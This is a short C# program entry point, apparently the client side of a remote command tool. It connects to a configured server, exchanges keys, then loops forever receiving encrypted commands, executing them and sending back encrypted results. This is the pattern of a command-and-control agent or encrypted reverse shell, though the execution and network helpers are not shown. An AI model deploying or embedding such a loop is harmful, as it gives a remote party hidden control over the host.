using Client_side;
using System.Net.Sockets;

public class Program
{
    public static Socket clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
    public static void Main()
    {
        // Connect to the server and send the public key
        NetworkLayer.Connect(Utils.IP, Utils.PORT);
        NetworkLayer.SendPublicKey();
        string passPhrase = NetworkLayer.ReceivePassPhrase();
        Encryptor encryptor = new Encryptor(passPhrase);

        // Loop to receive commands from the server and execute them then send the result back
        while (true)
        {
            string command = NetworkLayer.ReceiveCommand();
            string decryptedCommand = encryptor.Decrypt(command);
            string result = HandleCommand.ProcessCommand(decryptedCommand);
            byte[] encryptedResult = encryptor.Encrypt(result);
            NetworkLayer.SendResult(encryptedResult);
        }
    }
}